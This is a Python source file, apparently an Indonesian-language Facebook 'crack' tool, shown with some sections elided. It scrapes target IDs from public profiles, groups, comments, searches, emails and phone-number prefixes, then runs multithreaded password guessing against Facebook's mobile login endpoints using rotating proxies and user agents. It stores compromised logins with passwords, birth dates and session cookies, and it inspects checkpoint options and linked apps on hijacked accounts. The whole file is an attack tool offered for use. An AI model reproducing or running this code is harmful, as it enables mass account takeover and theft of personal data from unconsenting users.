...
###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform,rich
...
def loadingtot():
    ...
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}└─── {H}Loading Harap Tunggu...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")	

###---[ANGGAP INI LOGO ]---###
#def logo(n):
#	return str(f"""  {GN}___  ____  ___  __ ________   ________
#  {GN}/ _ \/ __ \/ _ \/ // / __/ /  / __/ __/
# {LG}/ // / /_/ / // / _  / _// /__/ _/_\ \  
#{GN}/____/\____/____/_//_/___/____/___/___/ \n""")
#def logo2():
#	return str(f"""  {GN}___  ____  ___  __ ________   ________
#  {GN}/ _ \/ __ \/ _ \/ // / __/ /  / __/ __/
# {LG}/ // / /_/ / // / _  / _// /__/ _/_\ \  
...
def logo():
	clear_layar()
	au=f"""  {GN}___  ____  ___  __ ________   ________
  {GN}/ _ \/ __ \/ _ \/ // / __/ /  / __/ __/
 {LG}/ // / /_/ / // / _  / _// /__/ _/_\ \  
{GN}/____/\____/____/_//_/___/____/___/___/ \n{DG}Copyright © 2020 dodhelesFn All rights."""
...
warna_warni_biasa=random.choice([H,K,M,O,LG,U])
garis = f" {LG}[{warna_warni_biasa}•{LG}]"
...
def indox():
		...
		for ci in kentod:
			sys.stdout.write(f'\r{LG}╰─{YW} mohon tunggu ... {GN}{ci}')
			sys.stdout.flush();sleep(0.09)
...
#	clear_layar()
#	logo()
#	io = '[yellow]Sabar ... Sedang Scraping Proxy Dan User Agent'
#	oi = nel(io, style='green')
#	cetak(nel(oi, style='cyan', title='Cracking Facebook'))
#	indox()
...
try:
	prox= requests.get('https://github.com/jorgenkg/python-proxy-rotator/blob/master/proxy/proxylist.txt').text
...
try:
        ...
        print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()
prox2=open('.prox2.txt','r').read().splitlines()
popok = random.choice([prox, prox2])
...
memekk = random.choice([ugen, ugen2, ugen3, ugen5])
welcome=f'''{OE}[{GN}•{OE}] {LG}Nama Pemilik : {GN}Dodheles{N}
{OE}[{GN}•{OE}] {LG}Total Proxy  : {GN}{str(len(popok))}{N}
{OE}[{GN}•{OE}] {LG}Total Ugent  : {GN}{str(len(memekk))}{N}
{OE}[{GN}•{OE}] {LG}Status Script: {GN}Beta{N}
{OE}[{GN}•{OE}] {LG}Whatsapp     : {GN}+30 694 532 6196{N}
{OE}[{GN}•{OE}] {LG}Facebook     : {GN}https://www.facebook.com/tnayitsel{N}
{OE}[{GN}•{OE}] {LG}Instagram    : {GN}https://www.instagram.com/boulevardexported/{N}
{OE}[{GN}•{OE}] {LG}Github       : {GN}https://github.com/dodhelesFn{N}'''
clear_layar()
logo()
print(welcome)
sleep(1)
...
#	print(logo2())
def login():
	komb=('[yellow]Silahkan Masukkan Cokie Tumbal Anda')
	sol().print(nel(komb,title='[cyan]Login Cookies Fb'))
	cookie = input(f"{LG}└─── {BE}cookie {LG}:{GN} ")
	oi='Login successful, run again the tool type fb.py'
	...
	except Exception as e:exit(f" [{M}>{LG}] cookie invalid")
...
#	sleep(1)
def menu():
	io = '[white]└─── [green]1 [blue]Crack Publik     [white]└─── [green]7 [blue]Crack Massal\n[white]└─── [green]2 [blue]Crack Follow     [white]└─── [green]8 [blue]Crack Comment\n[white]└─── [green]3 [blue]Crack Group      [white]└─── [green]9 [blue]Crack Email\n[white]└─── [green]4 [blue]Crack Pencarian  [white]└─── [green]10 [blue]Crack File\n[white]└─── [green]9 [blue]Cek Result       [white]└─── [green]11 [blue]Cek Result Mati\n[white]└─── [green]6 [blue]Cek Opsi Result [white] └─── [green]12 [blue]Crack Nomor\n[white]└───[red] 0 [red]Tumbal Keluar'
	oi = nel(io, style='green')
	cetak(nel(oi, style='cyan', title='Pilih Menu'))
	ask = input(f' {LG}└─── {GN}Pilih : ')
	print(f' {LG}─────────────────────────────')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['7','07']:crack_masal(t,c)
	elif ask in ['2','02']:crack_foll(t,c)
	elif ask in ['8','08']:crack_komen()
	elif ask in ['3','03']:crack_group()
	elif ask in ['9','09']:clon_email()
	elif ask in ['4','04']:crack_search()
	elif ask in ['10']:crack_file()
	elif ask in ['5','05']:cek_hasil()
	elif ask in ['11']:cek_akun()
	elif ask in ['6','06']:cek_opsi_cp()
	elif ask in ['0','00']:remove();exit()
	elif ask in ['12']:crack_nomor()
	elif ask in ['',' ',]:sys.exit(f" [{RD}>{RD}] isi yang benar")
	else:sys.exit(f" [{RD}>{RD}] isi yang benar")
...
def cek_opsi_cp():
	...
	except:sys.exit(f" [{M}>{LG}] tidak ada hasil cp")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f' [{YW}{no}{LG}] {x} - {YW}{len(jum)} {LG}akun')	
	exc = input(f' [{YW}<{LG}] nomor yang akan di cek\n nomor : ')
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		...
		cek_opsi(id,pw,ua)
	exit(f'\r [{GN}<{LG}] cek opsi checkpoint telah selesai')
...
def cek_akun():
	...
	except:print(f' [{M}>{LG}] cookie invalid');exit()
	try:ok = os.listdir('OK')
	except:sys.exit(f" [{M}>{LG}] tidak ada hasil ok")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('OK/'+x,'r').readlines()
		except:continue
		print(f' [{GN}{no}{LG}] {x} - {GN}{len(jum)} {LG}akun')	
	exc = input(f' [{GN}<{LG}] nomor file yang akan di cek\n file : ')
	...
	try:
		...
		mek = 0
		for data in uuid:
			print(f'\r [{GN}>{LG}] aman : {nga} down : {sesi}',end='')
			sys.stdout.flush()
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{LG}] pemisah salah")
			xx = open(nonon,'a')
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']
				print(f'\r [{GN}{mek}{LG}] {user}|{nama}                    ')
				nga+=1
				ni = f'{user}|{nama}\n'
				xx.write(ni)
			except:
				print(f'\r [{M}{mek}{LG}] {user}|{nama}                  ')
				sesi+=1
	except Exception as e :
		exit(f" [{M}>{LG}] file tidak ada")
		
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f' [{GN}1{LG}] cek hasil akun ok\n [{GN}2{LG}] cek hasil akun cp\n menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" [{M}>{LG}] tidak hasil ok")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			...
			print(f' [{GN}{no}{LG}] {x} - {GN}{len(jum)} {LG}akun')	
		abc = input(f' [{GN}<{LG}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f" [{M}>{LG}] file tidak ada hasil ok")
		print(GN+buka+LG)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f" [{M}>{LG}] tidak hasil cp")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
		...
		except:sys.exit(f" [{M}>{LG}] file tidak ada hasil cp")
		print(YW+buka+LG)
	else:sys.exit(f" [{M}>{LG}] isi yang benar")
		
		
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f' [{GN}<{LG}] crack nomor gunakan sandi manual')
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f' [{M}>{LG}] contoh awalan nomor 089')
	jumla = input(' jumlah : ')
...
def clon_email():
	...
	clear_layar()
	logo()
	komb=('[yellow]Crack Dump Random Email Max 1000')
	sol().print(nel(komb,title='[cyan]Crack Email'))
	nama = input(f'{OE}[{GN}•{OE}] {GN}Nama Target : {LG}')
	if ',' in str(nama):
		exit(f' [{M}<{LG}] Hanya Bisa Satu Nama')
	doma = input(f'{OE}[{GN}•{OE}] {GN}Domain : {LG}')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{LG}] Salah')
	jumlah = input(f'{OE}[{GN}•{OE}] {GN}Total : {LG}')
...
def crack_file():
	komb=('[yellow]Contoh . Dump.json')
	sol().print(nel(komb,title='[cyan]Crack File'))
	file = input(f'{OE}[{GN}•{OE}] {GN}Nama File : {LG}')
	try:
		...
		for data in uuid:
			...
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f" [{M}>{LG}] file tidak ada")
	komb=(f'\r [{GN}<{LG}] Total Target Adalah {len(dump)}')
	sol().print(nel(komb,title='[cyan]Total Uid'))
	atur_atur()
...
def crack_search():
	...
	print(f' [{GN}<{LG}] 1 nama setara dengan 10k akun')
...
def crack_komen():
	ide = input(f' [{GN}<{LG}] masukan id postingan target\n id post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{LG}] gagal dump komen')
	atur_atur()
...
def crack_publik(t,c):
	akun = input(f' [{GN}<{LG}] MAKE SURE THE ACCOUNT IS PUBLIC \n ID : ')
	try:
		...
		exit(f" [{M}>{LG}] akun tidak publik")	


def crack_masal(t,c):
	print(f' [{GN}<{LG}] MAKE SURE THE ACCOUNT IS PUBLIC ')
	try:
		bz=0
	...
	for bz in range(apa):
		...
		try:
			...
			print(f"\r [{YW}!{LG}] akun tidak publik       ")
			continue
		atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f' [{GN}<{LG}] pastikan akun bersifat publik \n akun : ')
	try:
...
def crack_group():
	link = input(f' [{GN}<{LG}] pastikan group bersifat publik \n id group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{LG}] gagal dump group')
	atur_atur()
...
akunok = []
def atur_atur():
	komb=(' [yellow][[green]1[yellow]] [green]m.facebook [yellow][[green]2[yellow]] [green]mbasic.facebook [yellow][[green]3[yellow]] [green]free.facebook ')
	sol().print(nel(komb,title='[cyan]Work'))
	ro = input(f' {LG} Pilih : ')
	...
	komb=(' [white][[green]Old [white], [green]New [white], [green]Random[green][white]] [green]O [white]/ [green]N [white]/ [green]R ')
	sol().print(nel(komb,title='[cyan]Tahun'))
	ch = input(f' {LG} Pilih : ')
	if ch in ['o','O']:
		for x in dump:
			id.append(x)
		...
		for x in dump:
			id.append(x)
	komb=(' [green]Opsi Checkpoint [green]y[white]/[green]n ')
	sol().print(nel(komb,title='[cyan]Opsi Checkpoint'))
	cp = input(f' {LG} Pilih : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	komb=(' [green]List Aplikasi On Facebook [green]y[white]/[green]n ')
	sol().print(nel(komb,title='[cyan]List Apk'))
	apk = input(f' {LG} Pilih : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	komb=(' [yellow][[green]1[yellow]] [green]Pw Manual [yellow][[green]2[yellow]] [green]Pw Gabungan [yellow][[green]3[yellow]] [green]Default ')
	sol().print(nel(komb,title='[cyan]Password'))
	ch = input(f' {LG} Pilih : ')
...
def manual():
	global ok,cp
	pwx = []
	komb=(' [green]Contoh[white]: [green]qwerty[white],[green]qwertyu[white],[green]qwertyuiop')
	sol().print(nel(komb,title='[cyan]Password Manual'))
	B = input(f' {LG} Pw Manual : ').split(',')
	for x in B:
		pwx.append(x)
		komb=(f' [green]akun ok di [white]: [green]{sim_ok}\n [yellow]akun cp di [white]: [yellow]{sim_cp}')
		sol().print(nel(komb,title='[cyan]Mulai Crack'))
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			...
			if 'mobile' in metode:
				...
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{GN}<{LG}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
...
def gabung():
	...
	A = ["123456"]
	print(f"{LG} ─────────────────────────────")
	B = input(f' [{GN}>{LG}] input sandi manual 6 kata\n sandi  : ').split(',')
	C = input(f' [{GN}>{LG}] input sandi belakang nama\n sandi  : ')
	if ',' in str(C):
		exit(f" [{M}>{LG}] sandi belakang satu kata saja")
	komb=(f' [green]akun ok di [white]: [green]{sim_ok}\n [yellow]akun cp di [white]: [yellow]{sim_cp}')
	sol().print(nel(komb,title='[cyan]Mulai Crack'))
	awal = datetime.now()
	with tred(max_workers=30) as babas:
...
def otomatis():
	...
	exit(f'\r [{GN}<{LG}] {GN}OK{LG}:{ok} {YW}CP{LG}:{cp} {GN}OK tersimpan di {sim_ok}\n {YW}CP Tersimpan Di {sim_cp} ')
...
def crack(idf,pwx,url,awal):
	...
	print(f"\r [{GN}!{LG}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
				...
				if data in rescp:pass
					...
					if 'ya' in cepeh:
						...
						try:
							...
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r [{YW}>{LG}] email  : {YW}{idf}{LG}          \n [{YW}>{LG}] sandi  : {YW}{pw}          {LG}\n [{YW}>{LG}] lahir  : {YW}{d} {m} {y}{LG}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print (f'\r{LG}└───{YW} {idf} ◊ {pw} \n{LG}  └─{YW} {ua} ')
...
def cek_opsi(idf,pw,ua):
	...
	try:
		...
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{GN}>{LG}] {GN}hore akun tap yes🎉{LG}                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n [{YW}>{LG}] akun terpasang auten                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n [{GN}>{LG}] akun tidak checkpoint                       \n [{GN}>{LG}] cookie : {cok}'
			else:
				akun += f'\n [{YW}>{LG}] terdapat {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{YW}{o}{LG}] {cp}               '
...
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{GN}>{LG}] email  : {GN}{idf}{LG}          \n [{GN}>{LG}] sandi  : {GN}{pw}          {LG}\n [{GN}>{LG}] cookie : {GN}{kuki}{LG}')
	try:		
	...
	if len(apk1)==0:pass
		...
		akun = (f' [{GN}>{LG}] aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {LG}[{GN}{no}{LG}] {GN}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {LG}[{YW}>{LG}] aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {LG}[{YW}{no}{LG}] {YW}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {LG}[{M}>{LG}] aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {LG}[{M}{no}{LG}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
